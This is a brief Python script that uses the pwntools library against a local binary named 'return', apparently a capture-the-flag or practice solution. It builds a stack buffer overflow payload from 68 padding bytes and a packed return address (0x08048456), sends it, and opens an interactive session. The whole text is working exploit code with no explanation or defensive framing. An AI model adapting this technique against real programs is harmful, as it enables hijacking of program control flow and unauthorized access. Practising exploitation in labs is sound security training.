from pwn import *

r = process("./return")
offset = 68
target = p32(0x08048456)
payload = ""
payload += "A"*offset
payload += target
r.sendline(payload)
r.interactive()
